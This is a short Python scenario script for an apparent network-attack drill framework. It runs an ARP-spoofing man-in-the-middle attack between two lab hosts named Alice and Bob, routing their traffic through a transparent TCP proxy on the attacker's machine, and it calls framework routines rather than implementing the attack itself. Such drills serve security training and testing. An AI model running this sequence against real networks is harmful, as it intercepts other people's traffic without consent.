"""
Scenario entrypoint for MITM with arp spoofing and transparent tcp proxy.
"""

from scapy.all import get_if_hwaddr

from nsak.core import DrillManager

PORT = 5000
ALICE_IP = "10.10.10.20"
BOB_IP = "10.10.10.30"
LISTEN_IP = "0.0.0.0"
ATTACKER_IP = "10.10.10.10"
ATTACKER_IFACE = "eth0"
ATTACKER_MAC = get_if_hwaddr(ATTACKER_IFACE)


def run() -> None:
    """
    Scenario, which runs MITM attack, based on arp spoofing.

    :return: None
    """

    # DrillManager.execute(
    #     "discover_services",
    #     iface=ATTACKER_IFACE,
    #     listen_ip=LISTEN_IP,
    #     port=PORT,
    #     target_ips=[ALICE_IP, BOB_IP],
    # )
    DrillManager.execute(
        "transparent_tcp_proxy",
        iface=ATTACKER_IFACE,
        ip=ATTACKER_IP,
        port=PORT,
    )
    DrillManager.execute(
        "arp_spoof",
        iface=ATTACKER_IFACE,
        target_ip=ALICE_IP,
        spoof_ip=BOB_IP
    )
    DrillManager.execute(
        "arp_spoof",
        iface=ATTACKER_IFACE,
        target_ip=BOB_IP,
        spoof_ip=ALICE_IP
    )
